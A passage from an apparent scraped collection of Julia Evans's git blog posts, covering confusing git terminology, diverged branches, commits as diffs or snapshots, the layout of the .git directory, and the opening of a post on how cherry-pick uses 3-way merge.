up a lot. \n\n Apparently you can run  git rebase --onto main otherbranch mybranch  to do\nthat. It seems impossible to me to remember the syntax for this (there are 3\ndifferent branch names involved, which for me is too many), but I heard about it from a\nbunch of people so I guess it must be useful. \n\n commit \n\n Someone mentioned that they found it confusing that commit is used both as a\nverb and a noun in git. \n\n for example: \n\n \n verb: “Remember to commit often” \n noun: “the most recent commit on  main “ \n \n\n My guess is that most folks get used to this relatively quickly, but this use\nof “commit” is different from how it’s used in SQL databases, where I think\n“commit” is just a verb (you “COMMIT” to end a transaction) and not a noun. \n\n Also in git you can think of a Git commit in 3 different ways: \n\n \n a  snapshot  of the current state of every file \n a  diff  from the parent commit \n a  history  of every previous commit \n \n\n None of those are wrong: different commands use commits in all of these ways.\nFor example  git show  treats a commit as a diff,  git log  treats it as a\nhistory, and  git restore  treats it as a snapshot. \n\n But git’s terminology doesn’t do much to help you understand in which sense a\ncommit is being used by a given command. \n\n more confusing terms \n\n Here are a bunch more confusing terms. I don’t know what a lot of these mean. \n\n things I don’t really understand myself: \n\n \n “the git pickaxe” (maybe this is  git log -S  and  git log -G , for searching the diffs of previous commits?) \n submodules (all I know is that they don’t work the way I want them to work) \n “cone mode” in git sparse checkout (no idea what this is but someone mentioned it) \n \n\n things that people mentioned finding confusing but that I left out of this post\nbecause it was already 3000 words: \n\n \n blob, tree \n the direction of “merge” \n “origin”, “upstream”, “downstream” \n that  push  and  pull  aren’t opposites \n the relationship between  fetch  and  pull  (pull = fetch + merge) \n git porcelain \n subtrees \n worktrees \n the stash \n “master” or “main” (it sounds like it has a special meaning inside git but it doesn’t) \n when you need to use  origin main  (like  git push origin main ) vs  origin/main \n \n\n github terms people mentioned being confused by: \n\n \n “pull request” (vs “merge request” in gitlab which folks seemed to think was clearer) \n what “squash and merge” and “rebase and merge” do (I’d never actually heard of  git merge --squash  until yesterday, I thought “squash and merge” was a special github feature) \n \n\n it’s genuinely “every git term” \n\n I was surprised that basically every other core feature of git was mentioned by\nat least one person as being confusing in some way. I’d be interested in\nhearing more examples of confusing git terms that I missed too. \n\n There’s another great post about this from 2012 called  the most confusing git terminology .\nIt talks more about how git’s terminology relates to CVS and Subversion’s terminology. \n\n If I had to pick the 3 most confusing git terms, I think right now I’d pick: \n\n \n a  head  is a branch,  HEAD  is the current branch \n “remote tracking branch” and “branch that tracks a remote” being different things \n how “index”, “staged”, “cached” all refer to the same thing \n \n\n that’s all! \n\n I learned a lot from writing this – I learned a few new facts about git, but\nmore importantly I feel like I have a slightly better sense now for what\nsomeone might mean when they say that everything in git is confusing. \n\n I really hadn’t thought about a lot of these issues before – like I’d never\nrealized how “tracking” is used in such a weird way when discussing branches. \n\n Also as usual I might have made some mistakes, especially since I ended up in a\nbunch of corners of git that I hadn’t visited before. \n\n \nAlso a very quick plug: I’m working on writing a\n zine  about git, if you’re interested in getting an email when it comes out you can\nsign up to my  very infrequent announcements mailing list .\n \n\n translations of this post \n\n \n Korean \n \n\n"},
{"url": "https://jvns.ca/blog/2024/02/01/dealing-with-diverged-git-branches/", "title": "Dealing with diverged git branches", "content": "\n     \n\n Hello! One of the most common problems I see folks struggling with in Git is\nwhen a local branch (like  main ) and a remote branch (maybe also called\n main ) have diverged. \n\n There are two things that make this situation hard: \n\n \n If you’re not used to interpreting git’s error messages, it’s nontrivial to\neven  realize  that your  main  has diverged from the remote  main  (git\nwill often just give you an intimidating but generic error message like\n ! [rejected] main -> main (non-fast-forward) error: failed to push some refs to 'github.com:jvns/int-exposed' ) \n Once you realize that your branch has diverged from the remote  main , there\nno single clear way to handle it (what you need to do depends on the\nsituation and your git workflow) \n \n\n So let’s talk about a) how to recognize when you’re in a situation where a local\nbranch and remote branch have diverged and b) what you can do about it! Here’s a\nquick table of contents: \n\n \n what does “diverged” mean? \n recognizing when branches are diverged \n\n \n way 1: git status \n way 2: git push \n way 3: git pull \n \n there’s no one solution \n\n \n solution 1.1: git pull –rebase \n solution 1.2: git pull –no-rebase \n solution 2.1: git push –force \n solution 2.2: git push –force-with-lease \n solution 3: git reset –hard origin/main \n \n \n\n Let’s start with what it means for 2 branches to have “diverged”. \n\n what does “diverged” mean? \n\n If you have a local  main  and a remote  main , there are 4 basic configurations: \n\n 1: up to date . The local and remote  main  branches are in the exact same place. Something like this: \n\n a - b - c - d\n            ^ LOCAL\n            ^ REMOTE\n \n\n 2: local is behind \n\n Here you might want to  git pull . Something like this: \n\n a - b - c - d - e\n    ^ LOCAL     ^ REMOTE\n \n\n 3: remote is behind \n\n Here you might want to  git push . Something like this: \n\n a - b - c - d - e\n    ^ REMOTE    ^ LOCAL\n \n\n 4: they’ve diverged :( \n\n This is the situation we’re talking about in this blog post. It looks something like this: \n\n a - b - c - d - e\n        \\       ^ LOCAL\n         -- f \n            ^ REMOTE\n \n\n There’s no one recipe for resolving this (how you want to handle it depends on\nthe situation and your git workflow!) but let’s talk about how to recognize\nthat you’re in that situation and some options for how to resolve it. \n\n recognizing when branches are diverged \n\n There are 3 main ways to tell that your branch has diverged. \n\n way 1:  git status \n\n The easiest way to is to run  git fetch  and then  git status . You’ll get a message something like this: \n\n $ git fetch\n$ git status\nOn branch main\nYour branch and 'origin/main' have diverged, <-- here's the relevant line!\nand have 1 and 2 different commits each, respectively.\n  (use \"git pull\" to merge the remote branch into yours)\n \n\n way 2:  git push \n\n When I run  git push , sometimes I get an error like this: \n\n $ git push\nTo github.com:jvns/int-exposed\n ! [rejected]        main -> main (non-fast-forward)\nerror: failed to push some refs to 'github.com:jvns/int-exposed'\nhint: Updates were rejected because the tip of your current branch is behind\nhint: its remote counterpart. Integrate the remote changes (e.g.\nhint: 'git pull ...') before pushing again.\nhint: See the 'Note about fast-forwards' in 'git push --help' for details.\n \n\n This doesn’t  always  mean that my local  main  and the remote  main  have\ndiverged (it could just mean that my  main  is behind), but for me it  often \nmeans that. So if that happens I might run  git fetch  and  git status  to\ncheck. \n\n way 3:  git pull \n\n If I  git pull  when my branches have diverged, I get this error message: \n\n $ git pull\nhint: You have divergent branches and need to specify how to reconcile them.\nhint: You can do so by running one of the following commands sometime before\nhint: your next pull:\nhint:\nhint:   git config pull.rebase false  # merge\nhint:   git config pull.rebase true   # rebase\nhint:   git config pull.ff only       # fast-forward only\nhint:\nhint: You can replace \"git config\" with \"git config --global\" to set a default\nhint: preference for all repositories. You can also pass --rebase, --no-rebase,\nhint: or --ff-only on the command line to override the configured default per\nhint: invocation.\nfatal: Need to specify how to reconcile divergent branches.\n \n\n This is pretty clear about the issue (“you have divergent branches”). \n\n git pull  doesn’t always spit out this error message though when your branches have diverged: it depends on how\nyou configure git. The three other options I’m aware of are: \n\n \n if you set  git config pull.rebase false , it’ll automatically start merging the remote  main \n if you set  git config pull.rebase true , it’ll automatically start rebasing onto the remote  main \n if you set  git config pull.ff only , it’ll exit with the error  fatal: Not possible to fast-forward, aborting. \n \n\n Now that we’ve talked about some ways to recognize that you’re in a situation\nwhere your local branch has diverged from the remote one, let’s talk about what\nyou can do about it. \n\n there’s no one solution \n\n There’s no “best” way to resolve branches that have diverged – it really\ndepends on your workflow for git and why the situation is happening. \n\n I use 3 main solutions, depending on the situation: \n\n \n I want to  keep both sets of changes  on  main . To do this, I’ll run  git\npull --rebase . \n The  remote changes are useless  and I want to overwrite them. To do this,\nI’ll run  git push --force \n The  local changes are useless  and I want to overwrite them. To do this, I’ll\nrun  git reset --hard origin/main \n \n\n Here are some more details about all 3 of these solutions. \n\n solution 1.1:  git pull --rebase \n\n This is what I do when I want to keep both sets of changes. It rebases  main \nonto the remote  main  branch. I mostly use this in repositories where I’m\ndoing all of my work on the  main  branch. \n\n You can configure  git config pull.rebase true , to do this automatically every\ntime, but I don’t because sometimes I actually want to use solutions 2 or 3\n(overwrite my local changes with the remote, or the reverse). I’d rather be\nwarned “hey, these branches have diverged, how do you want to handle it?” and\ndecide for myself if I want to rebase or not. \n\n solution 1.2:  git pull --no-rebase \n\n This starts a merge between the  local  and remote  main . Here you’ll need to: \n\n \n Run  git pull --no-rebase . This starts a merge and (if it succeeds) opens a text editor so that you can confirm that you want to commit the merge \n Save the file in your text editor. \n \n\n I don’t have too much to say about this because I’ve never done it. I always\nuse rebase instead. That’s a personal workflow choice though, lots of people have very\nlegitimate reasons to  avoid rebase . \n\n solution 2.1:  git push --force \n\n Sometimes I know that the work on the remote  main  is actually useless and I\njust want to overwrite it with whatever is on my local  main . \n\n I do this pretty often on private repositories where I’m the only committer,\nfor example I might: \n\n \n git push  some commits \n belatedly decide I want to change the most recent commit \n make the changes and run  git commit --amend \n run  git push --force \n \n\n Of course, if the repository has many different committers, force-pushing in\nthis way can cause a lot of problems. On shared repositories I’ll usually\nenable  github branch protection \nso that it’s impossible to force push. \n\n solution 2.2:  git push --force-with-lease \n\n I’ve still never actually used  git push --force-with-lease , but I’ve seen a\nlot of people recommend it as an alternative to  git push --force  that makes\nsure that nobody else has changed the branch since the last time you pushed or\nfetched, so that you don’t accidentally blow their changes away. \n\n Seems like a good option. I did notice that  --force-with-lease  isn’t\nfoolproof though – for example  this git commit \ntalks about how if you use VSCode’s autofetching feature to continuously  git fetch ,\nthen  --force-with-lease  won’t help you. \n\n Apparently now Git also has  --force-with-lease --force-if-includes \n( documented here ),\nwhich I think checks the reflog to make sure that you’ve already integrated the\nremote branch into your branch somehow. I still don’t totally understand this\nbut I found this  stack overflow conversation \nhelpful. \n\n solution 3.1:  git reset --hard origin/main \n\n You can use this as the reverse of  git push --force  (since there’s no  git pull --force ). I do this when I know that\nmy  local  work shouldn’t be there and I want to throw it away and replace it\nwith whatever’s on the remote branch. \n\n For example, I might do this if I accidentally made a commit to  main  that\nactually should have been on new branch. In that case I’ll also create a new\nbranch ( new-branch  in this example) to store my local work on the  main \nbranch, so it’s not really being thrown away. \n\n Fixing that problem looks like this: \n\n git checkout main\n\n# 1. create `new-branch` to store my work\ngit checkout -b new-branch   \n\n# 2. go back to the `main` branch I messed up\ngit checkout main            \n\n# 3. make sure that my `origin/main` is up to date\ngit fetch                    \n\n# 4. double check to make sure I don't have any uncomitted \n# work because `git reset --hard` will blow it away                                       \ngit status                   \n\n# 5. force my local branch to match the remote `main`                               \n#    NOTE: replace `origin/main` with the actual name of the\n#    remote/branch, you can get this from `git status`.\ngit reset --hard origin/main  \n \n\n This “store your work on  main  on a new branch and then  git reset --hard ” pattern can\nalso be useful if you’re not sure yet how to solve the conflict, since most\npeople are more used to merging 2 local branches than dealing with merging a\nremote branch. \n\n As always  git reset --hard  is a dangerous action and you can permanently lose\nyour uncommitted work. I always run  git status  first to make sure I don’t\nhave any uncommitted changes. \n\n Some alternatives to using  git reset --hard  for this: \n\n \n check out some other branch and run  git branch -f main origin/main . \n check out some other branch and run  git fetch origin main:main --force \n \n\n that’s all! \n\n I’d never really thought about how confusing the  git push  and  git pull \nerror messages can be if you’re not used to reading them. \n\n"},
{"url": "https://jvns.ca/blog/2024/01/05/do-we-think-of-git-commits-as-diffs--snapshots--or-histories/", "title": "Do we think of git commits as diffs, snapshots, and/or histories?", "content": "\n     \n\n Hello! I’ve been extremely slowly trying to figure how to explain every core\nconcept in Git (commits! branches! remotes! the staging area!) and commits have\nbeen surprisingly tricky. \n\n Understanding how git commits are implemented feels pretty straightforward to\nme (those are facts! I can look it up!), but it’s been much harder to figure\nout how other people think about commits. So like I’ve been doing a lot\nrecently, I went on Mastodon and started asking some questions. \n\n how do people think about Git commits? \n\n I did a  highly unscientific poll  on Mastodon about how people think about Git\ncommits: is it a snapshot? is it a diff? is it a list of every previous commit?\n(Of course it’s legitimate to think about it as all three, but I was curious\nabout the  primary  way people think about Git commits). Here it is: \n\n \n\n The results were: \n\n \n 51% diff \n 42% snapshot \n 4% history of every previous commit \n 3% “other” \n \n\n I was really surprised that it was so evenly split between diffs and snapshots.\nPeople also made some interesting kind of contradictory statements like “in my\nmind a commit is a diff, but I think it’s actually implemented as a snapshot”\nand “in my mind a commit is a snapshot, but I think it’s actually implemented\nas a diff”. We’ll talk more about how a commit is actually implemented later in\nthe post. \n\n Before we go any further: when we say “a diff” or “a snapshot”, what does that\nmean? \n\n what’s a diff? \n\n What I mean by a diff is probably obvious: it’s what you get when you run  git show\nCOMMIT_ID . For example here’s a typo fix from rbspy: \n\n diff --git a/src/ui/summary.rs b/src/ui/summary.rs\nindex 5c4ff9c..3ce9b3b 100644\n--- a/src/ui/summary.rs\n+++ b/src/ui/summary.rs\n@@ -160,7 +160,7 @@ mod tests {\n \";\n\n         let mut buf: Vec<u8> = Vec::new();\n-        stats.write(&mut buf).expect(\"Callgrind write failed\");\n+        stats.write(&mut buf).expect(\"summary write failed\");\n         let actual = String::from_utf8(buf).expect(\"summary output not utf8\");\n         assert_eq!(actual, expected, \"Unexpected summary output\");\n     }\n \n\n You can see it on GitHub here:  https://github.com/rbspy/rbspy/commit/24ad81d2439f9e63dd91cc1126ca1bb5d3a4da5b \n\n what’s a snapshot? \n\n When I say “a snapshot”, what I mean is “all the files that you get when you\nrun  git checkout COMMIT_ID ”. \n\n Git often calls the list of files for a commit a “tree” (as in “directory\ntree”), and you can see all of the files for the above example commit here on\nGitHub: \n\n https://github.com/rbspy/rbspy/tree/24ad81d2439f9e63dd91cc1126ca1bb5d3a4da5b  (it’s  /tree/  instead of  /commit/ ) \n\n is “how Git implements it” really the right way to explain it? \n\n Probably the most common piece of advice I hear related to learning Git is\n“just learn how Git represents things internally, and everything will make\nsense”. I obviously find this perspective extremely appealing (if you’ve spent\nany time reading this blog, you know I  love  thinking about how things are\nimplemented internally). \n\n But as a strategy for teaching Git, it hasn’t been as successful as I’d hoped!\nOften I’ve eagerly started explaining “okay, so git commits are snapshots with\na pointer to their parent, and then a branch is a pointer to a commit, and…“,\nbut the person I’m trying to help will tell me that they didn’t really find\nthat explanation that useful at all and they still don’t get it. So I’ve been\nconsidering other options. \n\n Let’s talk about the internals a bit anyway though. \n\n how git represents commits internally: snapshots \n\n Internally, git represents commits as snapshots (it stores the “tree” of the\ncurrent version of every file). I wrote about this in  In a git repository, where do your files live? ,\nbut here’s a very quick summary of what the internal format looks like. \n\n Here’s how a commit is represented: \n\n $ git cat-file -p 24ad81d2439f9e63dd91cc1126ca1bb5d3a4da5b\ntree e197a79bef523842c91ee06fa19a51446975ec35\nparent 26707359cdf0c2db66eb1216bf7ff00eac782f65\nauthor Adam Jensen <adam@acj.sh> 1672104452 -0500\ncommitter Adam Jensen <adam@acj.sh> 1672104890 -0500\n\nFix typo in expectation message\n \n\n and here’s what we get when we look at this tree object: a list of every file /\nsubdirectory in the repository’s root directory as of that commit: \n\n $ git cat-file -p e197a79bef523842c91ee06fa19a51446975ec35\n040000 tree 2fcc102acd27df8f24ddc3867b6756ac554b33ef\t.cargo\n040000 tree 7714769e97c483edb052ea14e7500735c04713eb\t.github\n100644 blob ebb410eb8266a8d6fbde8a9ffaf5db54a5fc979a\t.gitignore\n100644 blob fa1edfb73ce93054fe32d4eb35a5c4bee68c5bf5\tARCHITECTURE.md\n100644 blob 9c1883ee31f4fa8b6546a7226754cfc84ada5726\tCODE_OF_CONDUCT.md\n100644 blob 9fac1017cb65883554f821914fac3fb713008a34\tCONTRIBUTORS.md\n100644 blob b009175dbcbc186fb8066344c0e899c3104f43e5\tCargo.lock\n100644 blob 94b87cd2940697288e4f18530c5933f3110b405b\tCargo.toml\n \n\n What this means is that checking out a Git commit is always fast: it’s just as\neasy for Git to check out a commit from yesterday as it is to check out a\ncommit from 1 million commits ago. Git never has to replay 10000 diffs to\nfigure out the current state or anything, because commits just aren’t stored as\ndiffs. \n\n snapshots are compressed using packfiles \n\n I just said that Git commits are snapshots, but when someone says “I think of\ngit commits as a snapshot, but I think internally they’re actually diffs”,\nthat’s actually kind of true too! Git commits are not represented as diffs in\nthe sense you’re probably used to (they’re not represented on disk as a diff\nfrom the previous commit), but the basic intuition that if you’re editing a\n10,000 lines 500 times, it would be inefficient to store 500 copies of that\nfile is right. \n\n Git does have a way of storing files as differences from other ways. This is\ncalled “packfiles” and periodically git will do a garbage collection and\ncompress your data into packfiles to save disk space. When you  git clone  a\nrepository git will also compress the data. \n\n I don’t have space for a full explanation of how packfiles work in this post\n(Aditya Mukerjee’s  Unpacking Git packfiles \nis my favourite writeup of how they work). But here’s a quick summary of my\nunderstanding of how deltas work and how they’re different from diffs: \n\n \n Objects are stored as a reference to an “original file”, plus a “delta” \n the delta has a bunch of instructions like “read bytes 0 to 100, then insert bytes ‘hello there’, then read bytes 120 to 200”. It cobbles together bytes from the original plus new text. So there’s no notion of “deletions”, just copies and additions. \n I think there are less layers of deltas: I don’t know how to actually check how many layers of deltas Git actually had to go through to get a given object, but my impression is that it usually isn’t very many. Probably less than 10? I’d love to know how to actually find this out though. \n The “original file” isn’t necessarily from the previous commit, it could be anything. Maybe it could even be from a later commit? I’m not sure about that. \n There’s no “right” algorithm for how to compute deltas, Git just has some approximate heuristics \n \n\n what actually happens when you do a diff is kind of weird \n\n When I run  git show SOME_COMMIT  to look at the diff for a commit, what\nactually happens is kind of counterintuitive. My understanding is: \n\n \n git looks in the packfiles and applies deltas to reconstruct the tree for that commit and for its parent. \n git diffs the two directory trees (the current commit’s tree, and the parent commit’s tree). Usually this is pretty fast because almost all of\nthe files are exactly the same, so git can just compare the hashes of the identical files and do nothing almost all of the time. \n finally git shows me the diff \n \n\n So it takes deltas, turns them into a snapshot, and then calculates a diff. It\nfeels a little weird because it starts with a diff-like-thing and ends up with\nanother diff-like-thing, but the deltas and diffs are actually totally\ndifferent so it makes sense. \n\n That said, the way I think of it is that git stores commits as snapshots and\npackfiles are just an implementation detail to save disk space and make clones\nfaster. I’ve never actually needed to know how packfiles work for any practical\nreason, but it does help me understand how it’s  possible  for git commits to\nbe snapshots without using way too much disk space. \n\n a “wrong” mental model for git: commits are diffs \n\n I think a pretty common “wrong” mental model for Git is: \n\n \n commits are stored as diffs from the previous commit (plus a pointer to the parent commit(s) and an author and message). \n to get the current state for a commit, Git starts at the beginning and\nreplays all the previous commits \n \n\n This model is obviously not  true  (in real life, commits are stored as\nsnapshots, and diffs are calculated from those snapshots), but it seems very\nuseful and coherent to me! It gets a little weird with merge commits, but maybe\nyou just say it’s stored as a diff from the first parent of the merge. \n\n I think wrong mental models are often extremely useful, and this one doesn’t\nseem very problematic to me for every day Git usage. I really like that it\nmakes the thing that we deal with the most often (the diff) the most\nfundamental – it seems really intuitive to me. \n\n I’ve also been thinking about other “wrong” mental models you can have about\nGit which seem pretty useful like: \n\n \n commit messages can be edited (they can’t really, actually you make a copy of the commit with a new message, and the old commit continues to exist) \n commits can be moved to have a different base (similarly, they’re copied) \n \n\n I feel like there’s a whole very coherent “wrong” set of ideas you can have\nabout git that are pretty well supported by Git’s UI and not very problematic\nmost of the time. I think it can get messy when you want to undo a change or\nwhen something goes wrong though. \n\n some advantages of “commit as diff” \n\n Personally even though I know that in Git commits are snapshots, I probably think of them as diffs most of the time, because: \n\n \n most of the time I’m concerned with the  change  I’m making – if I’m just\nchanging 1 line of code, obviously I’m mostly thinking about just that 1 line\nof code and not the entire current state of the codebase \n when you click on a Git commit on GitHub or use  git show , you see the diff, so it’s just what I’m used to seeing \n I use rebase a lot, which is all about replaying diffs \n \n\n some advantages of “commit as snapshot” \n\n I also think about commits as snapshots sometimes though, because: \n\n \n git often gets confused about file moves: sometimes if I move a file and edit\nit, Git can’t recognize that it was moved and instead will show it as\n“deleted old.py, added new.py”. This is because git only stores snapshots, so\nwhen it says “moved old.py -> new.py”, it’s just guessing because the\ncontents of  old.py  and  new.py  are similar. \n it’s conceptually much easier to think about what  git checkout COMMIT_ID  is doing (the idea of replaying 10000 commits just feels stressful to me) \n merge commits kind of make more sense to me as snapshots, because the merged\ncommit can actually be literally anything (it’s just a new snapshot!). It\nhelps me understand why you can make arbitrary changes when you’re resolving\na merge conflict, and why it’s so important to be careful about conflict\nresolution. \n \n\n some other ways to think about commits \n\n Some folks in the Mastodon replies also mentioned: \n\n \n “extra” out-of-band information about the commit, like an email or a GitHub pull request or just a conversation you had with a coworker \n thinking about a diff as a “before state + after state” \n and of course, that lots of people think of commits in lots of different ways depending on the situation \n \n\n some other words people use to talk about commits might be less ambiguous: \n\n \n “revision” (seems more like a snapshot) \n “patch” (seems more like a diff) \n \n\n that’s all for now! \n\n It’s been very difficult for me to get a sense of what different mental models\npeople have for git. It’s especially tricky because people get really into\npolicing “wrong” mental models even though those “wrong” models are often\nreally useful, so folks are reluctant to share their “wrong” ideas for fear of\nsome Git Explainer coming out of the woodwork to explain to them why they’re\nWrong. (these Git Explainers are often well-intentioned, but it still has a chilling effect either way) \n\n But I’ve been learning a lot! I still don’t feel totally clear about how I want to\ntalk about commits, but we’ll get there eventually. \n\n Thanks to Marco Rogers, Marie Flanagan, and everyone on Mastodon for talking to\nme about git commits. \n\n"},
{"url": "https://jvns.ca/blog/2024/01/26/inside-git/", "title": "Inside .git", "content": "\n     \n\n Hello! I posted a comic on Mastodon this week about what’s in the  .git \ndirectory and someone requested a text version, so here it is. I added some\nextra notes too. First, here’s the image. It’s a ~15 word explanation of each\npart of your  .git  directory. \n\n \n\n You can  git clone https://github.com/jvns/inside-git  if you want to run all\nthese examples yourself. \n\n Here’s a table of contents: \n\n \n HEAD: .git/head \n branch: .git/refs/heads/main \n commit: .git/objects/10/93da429… \n tree: .git/objects/9f/83ee7550… \n blobs: .git/objects/5a/475762c… \n reflog: .git/logs/refs/heads/main \n remote-tracking branches: .git/refs/remotes/origin/main \n tags: .git/refs/tags/v1.0 \n the stash: .git/refs/stash \n .git/config \n hooks: .git/hooks/pre-commit \n the staging area: .git/index \n this isn’t exhaustive \n this isn’t meant to completely explain git \n \n\n The first 5 parts ( HEAD , branch, commit, tree, blobs) are the core of git. \n\n HEAD:  .git/head \n\n HEAD  is a tiny file that just contains the name of your current  branch . \n\n Example contents: \n\n $ cat .git/HEAD\nref: refs/heads/main\n \n\n HEAD  can also be a commit ID, that’s called “detached HEAD state”. \n\n branch:  .git/refs/heads/main \n\n A  branch  is stored as a tiny file that just contains 1  commit ID . It’s stored\nin a folder called  refs/heads . \n\n Example contents: \n\n $ cat .git/refs/heads/main\n1093da429f08e0e54cdc2b31526159e745d98ce0\n \n\n commit:  .git/objects/10/93da429... \n\n A  commit  is a small file containing its parent(s), message,  tree , and author. \n\n Example contents: \n\n $ git cat-file -p 1093da429f08e0e54cdc2b31526159e745d98ce0\ntree 9f83ee7550919867e9219a75c23624c92ab5bd83\nparent 33a0481b440426f0268c613d036b820bc064cdea\nauthor Julia Evans <julia@example.com> 1706120622 -0500\ncommitter Julia Evans <julia@example.com> 1706120622 -0500\n\nadd hello.py\n \n\n These files are compressed, the best way to see objects is with  git cat-file -p HASH . \n\n tree:  .git/objects/9f/83ee7550... \n\n Trees  are small files with directory listings. The files in it are called  blobs . \n\n Example contents: \n\n $  git cat-file -p 9f83ee7550919867e9219a75c23624c92ab5bd83\n100644 blob e69de29bb2d1d6434b8b29ae775ad8c2e48c5391\t.gitignore\n100644 blob 665c637a360874ce43bf74018768a96d2d4d219a\thello.py\n040000 tree 24420a1530b1f4ec20ddb14c76df8c78c48f76a6\tlib\n \n\n The permissions here LOOK like unix permissions, but they’re actually super\nrestricted, only 644 and 755 are allowed. \n\n blobs:  .git/objects/5a/475762c... \n\n blobs  are the files that contain your actual code \n\n Example contents: \n\n $ git cat-file -p 665c637a360874ce43bf74018768a96d2d4d219a\t\nprint(\"hello world!\")\n \n\n Storing a new blob with every change can get big, so  git gc  periodically\n packs them  for efficiency in  .git/objects/pack . \n\n reflog:  .git/logs/refs/heads/main \n\n The reflog stores the history of every branch, tag, and HEAD. For (mostly) every file in  .git/refs , there’s a corresponding log in  .git/logs/refs . \n\n Example content for the  main  branch: \n\n $ tail -n 1 .git/logs/refs/heads/main\n33a0481b440426f0268c613d036b820bc064cdea\n1093da429f08e0e54cdc2b31526159e745d98ce0\nJulia Evans <julia@example.com>\n1706119866 -0500\ncommit: add hello.py\n \n\n each line of the reflog has: \n\n \n before/after commit IDs \n user \n timestamp \n log message \n \n\n Normally it’s all one line, I just wrapped it for readability here. \n\n remote-tracking branches:  .git/refs/remotes/origin/main \n\n Remote-tracking branches  store the most recently seen  commit ID  for a remote branch \n\n Example content: \n\n $ cat .git/refs/remotes/origin/main\nfcdeb177797e8ad8ad4c5381b97fc26bc8ddd5a2\n \n\n When git status says “you’re up to date with  origin/main ”, it’s just looking\nat this. It’s often out of date, you can update it with  git fetch origin\nmain . \n\n tags:  .git/refs/tags/v1.0 \n\n A tag is a tiny file in  .git/refs/tags  containing a commit ID. \n\n Example content: \n\n $ cat .git/refs/tags/v1.0\n1093da429f08e0e54cdc2b31526159e745d98ce0\n \n\n Unlike branches, when you make new commits it doesn’t update the tag. \n\n the stash:  .git/refs/stash \n\n The stash is a tiny file called  .git/refs/stash . It contains the commit ID of a commit that’s created when you run  git stash . \n\n cat .git/refs/stash\n62caf3d918112d54bcfa24f3c78a94c224283a78\n \n\n The stash is a stack, and previous values are stored in  .git/logs/refs/stash  (the reflog for  stash ). \n\n cat .git/logs/refs/stash\n62caf3d9 e85c950f Julia Evans <julia@example.com> 1706290652 -0500\tWIP on main: 1093da4 add hello.py\n00000000 62caf3d9 Julia Evans <julia@example.com> 1706290668 -0500\tWIP on main: 1093da4 add hello.py\n \n\n Unlike branches and tags, if you  git stash pop  a commit from the stash, it’s\n deleted  from the reflog so it’s almost impossible to find it again. The\nstash is the only reflog in git where things get deleted very soon after\nthey’re added. (entries expire out of the branch reflogs too, but generally\nonly after 90 days) \n\n A note on refs: \n\n At this point you’ve probably noticed that a lot of things (branches,\nremote-tracking branches, tags, and the stash) are commit IDs in  .git/refs .\nThey’re called “references” or “refs”. Every ref is a commit ID, but the\ndifferent types of refs are treated VERY differently by git, so I find it\nuseful to think about them separately even though they all use\nthe same file format. For example, git deletes things from the stash reflog in\na way that it won’t for branch or tag reflogs. \n\n .git/config \n\n .git/config  is a config file for the repository. It’s where you configure\nyour remotes. \n\n Example content: \n\n [remote \"origin\"] \nurl = git@github.com: jvns/int-exposed \nfetch = +refs/heads/*: refs/remotes/origin/* \n[branch \"main\"] \nremote = origin \nmerge refs/heads/main\n \n\n git has local and global settings, the local settings are here and the global\nones are in  ~/.gitconfig  hooks \n\n hooks:  .git/hooks/pre-commit \n\n Hooks are optional scripts that you can set up to run (eg before a commit) to do anything you want. \n\n Example content: \n\n #!/bin/bash \nany-commands-you-want\n \n\n (this obviously isn’t a real pre-commit hook) \n\n the staging area:  .git/index \n\n The staging area stores files when you’re preparing to commit. This one is a\nbinary file, unlike a lot of things in git which are essentially plain text\nfiles. \n\n As far as I can tell the best way to look at the contents of the index is with  git ls-files --stage : \n\n $ git ls-files --stage\n100644 e69de29bb2d1d6434b8b29ae775ad8c2e48c5391 0\t.gitignore\n100644 665c637a360874ce43bf74018768a96d2d4d219a 0\thello.py\n100644 e69de29bb2d1d6434b8b29ae775ad8c2e48c5391 0\tlib/empty.py\n \n\n this isn’t exhaustive \n\n There are some other things in  .git  like  FETCH_HEAD ,  worktrees , and\n info . I only included the ones that I’ve found it useful to understand. \n\n this isn’t meant to completely explain git \n\n One of the most common pieces of advice I hear about git is “just learn how\nthe  .git  directory is structured and then you’ll understand everything!“. \n\n I love understanding the internals of things more than anyone, but there’s a\nLOT that “how the .git directory is structured” doesn’t explain, like: \n\n \n how merges and rebases work and how they can go wrong (for instance this list of  what can go wrong with rebase ) \n how exactly your colleagues are using git, and what guidelines you should be following to work with them successfully \n how pushing/pulling code from other repositories works \n how to handle merge conflicts \n \n\n Hopefully this will be useful to some folks out there though. \n\n some other references: \n\n \n the book  building git  by James Coglan (side note: looks like there’s a  50% off discount for the rest of January ) \n git from the inside out  by mary rose cook \n the official  git repository layout docs \n \n\n"},
{"url": "https://jvns.ca/blog/2023/11/10/how-cherry-pick-and-revert-work/", "title": "How git cherry-pick and revert use 3-way merge", "content": "\n     \n\n Hello! I was trying to explain to someone how  git cherry-pick  works the other\nday, and I found myself getting confused. \n\n What went wrong was: I thought that  git cherry-pick  was basically applying a\npatch, but when I tried to actually do it that way, it didn’t work! \n\n Let’s talk about what I thought  cherry-pick  did (applying a patch), why\nthat’s not quite true, and what it actually does instead (a “3-way merge”). \n\n This post is extremely in the weeds and you definitely don’t need to understand\nthis stuff to use git effectively. But if you (like me) are curious about git’s\ninternals, let’s talk about it! \n\n cherry-pick isn’t applying a patch \n\n The way I previously understood  git cherry-pick COMMIT_ID  is: \n\n \n calculate the diff for  COMMIT_ID , like  git show COMMIT_ID --patch > out.patch \n Apply the patch to the current branch, like  git apply out.patch \n \n\n Before we get into this – I want to be clear that this model is mostly\nright, and if that’s your mental model that’s fine. But it’s wrong in some\nsubtle ways and I think that’s kind of interesting, so let’s see how it works. \n\n If I try to do the “calculate the diff and apply the patch” thing in a case\nwhere there’s a merge conflict, here’s what happens: \n\n $ git show 10e96e46 --patch > out.patch\n$ git apply out.patch\nerror: patch failed: content/post/2023-07-28-why-is-dns-still-hard-to-learn-.markdown:17\nerror: content/post/2023-07-28-why-is-dns-still-hard-to-learn-.markdown: patch does not apply\n \n\n This just fails – it doesn’t give me any way to resolve the conflict or figure\nout how to solve the problem. \n\n This is quite different from what actually happens when run  git cherry-pick ,\nwhich is that I get a merge conflict: \n\n $ git cherry-pick 10e96e46\nerror: could not apply 10e96e46... wip\nhint: After resolving the conflicts, mark them with\nhint: \"git add/rm <pathspec>\", then run\nhint: \"git cherry-pick --continue\".\n \n\n So it seems like the “git is applying a patch” model isn’t quite right. But the\nerror message literally does say “could not  apply  10e96e46”, so it’s not quite\n wrong  either. What’s going on? \n\n so what is cherry-pick doing? \n\n I went digging through git’s source code to see how  cherry-pick  works, and\nended up at  this line of code : \n\n res = 